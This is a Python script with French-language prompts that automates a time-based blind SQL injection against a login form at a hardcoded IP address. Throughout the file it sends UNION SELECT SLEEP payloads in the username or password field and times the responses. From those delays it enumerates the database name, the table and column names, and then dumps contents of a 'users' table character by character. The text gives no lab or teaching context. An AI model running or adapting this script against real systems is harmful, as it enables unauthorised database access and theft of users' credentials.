import requests
import time

def db_name():
    global usr
    usr = "idc"
    global dictionary
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    global table 
    table = ""
    global url
    url = "http://51.15.136.118/login_cookie.php"
    global vulnerable_input
    vulnerable_input = True
    
    a=0
    db = []
    texte = ""
    TIME = 5

    for letter in dictionary:
        for num in range(1, 10):
            nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
            passwd = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
            """print(passwd)"""
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                table = nums
                break
        if total_time >= TIME:
            break 
    """print(table)"""

    if table == "":
        for letter in dictionary:
            for num in range(1, 10):
                nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
                passwd = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
                """print(passwd)"""
                start_time = time.time()
                response = requests.post(url, data={'username': passwd, 'password': usr})
                end_time = time.time()
                total_time = end_time - start_time
                if total_time >= TIME:
                    table = nums
                    break
            if total_time >= TIME:
                break 
        """print(table)"""
        if table != "":
            vulnerable_input = False
            print(vulnerable_input)
    if table == "":
        print("Pas de base de données trouvées")
        exit()


    for i in range(1, 20):
        for j in range(0, len(dictionary)):
            passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
            """print(passwd)"""
            start_time = time.time()
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': passwd, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            """print(a)"""
            if a > 37:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    """print(texte)"""
    db.append(texte)
    """print(db)"""

    b=0
    for x in db:
        b += 1
        print("Database {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(db[c-1]))
    """faire pause"""
    final_db=""
    jsp = final_db + "".join(db[c-1])
    return jsp


def table_name(database):
    tables_name=[]
    a=0
    texte = ""
    TIME = 5
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 37:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    tables_name.append(texte)
                    print(tables_name)
                    texte = ""
                    a=0
                    break
                else:
                    break
            passwd = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
            """print(passwd)"""
            start_time = time.time()
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': passwd, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            """print(texte)"""
            """print(tables_name)
            print(a)"""
            
            if total_time >= TIME:
                texte += dictionary[j]
                i += 1
                j = 0
                a = 0
                break
    """print(tables_name)"""
    b=0
    for x in tables_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(tables_name[c-1]))
    final_db=""
    jsp2 = final_db + "".join(tables_name[c-1])
    return jsp2


def column_name(database, nom_table):
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    global columns_name
    columns_name=[]
    a=0
    texte = ""
    TIME = 5
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 37:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    columns_name.append(texte)
                    print(columns_name)
                    texte = ""
                    a=0
                    break
                else:
                    break
            passwd = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            """print(passwd)"""
            start_time = time.time()
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': passwd, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            """print(texte)"""
            """print(columns_name)
            print(a)"""
            
            if total_time >= TIME:
                texte += dictionary[j]
                i += 1
                j = 0
                a = 0
                break
    """print(columns_name)"""
    b=0
    for x in columns_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    return columns_name


def trouver_tab0(nom_table):
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    tab = columns_name
    texte = ""
    TIME = 5
    table = ",1,2"
    a = 0
    idk = []
    for i in range(1, 10):
        for j in range(0, len(dictionary)):
            if a > 37:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    idk.append(texte)
                    print(idk)
                    a=0
                    texte = ""
                    break
            start_time = time.time()
            passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
            if vulnerable_input == False:   
                response = requests.post(url, data={'username': passwd, 'password': usr})
            else:
                response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                a=0
            
            a +=1
    print(idk)
    return idk


def dump_columns(table, tab0, column_name):
    dictionary = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","-"]
    tab = column_name
    nom_colonne = tab0
    texte = ""
    TIME = 5
    table = ",1,2"
    a = 0
    z=0
    idk = []

    while z <= (len(tab)):
        z += 1
        for x in nom_colonne:
            x = int(x)
            for i in range (1,30):
                for j in range(0, len(dictionary)):
                    if a > 37:
                        if texte != "":
                            print(texte)
                            idk.append(texte)
                            a=0
                            texte = ""
                            if x < len(nom_colonne):
                                x += 1
                            elif z < len(tab)-1:
                                x = 1
                                z += 1
                            else:
                                c = len(idk)
                                d = c//2
                                a=idk[d:]
                                b=idk[:d]
                                print(tab)
                                for j in range(len(nom_colonne)):
                                    print(" {} : {} : {} ".format(nom_colonne[j], b[j], a[j]))
                                quit()
                            break
                        else:
                            break

                    start_time = time.time()
                    passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
                    print(passwd)
                    if vulnerable_input == False:   
                        response = requests.post(url, data={'username': passwd, 'password': usr})
                    else:
                        response = requests.post(url, data={'username': usr, 'password': passwd})
                    end_time = time.time()
                    total_time = end_time - start_time
                    a+=1
                    if total_time >= TIME:
                        texte += dictionary[j]
                        a=0
                        j=0
                        i+=1
                        break


nom_base_de_donnée = db_name()
nom_table = table_name(nom_base_de_donnée)
nom_colonne = column_name(nom_base_de_donnée, nom_table)
tab0 = trouver_tab0(nom_table)
param = dump_columns(nom_table, tab0, nom_colonne)
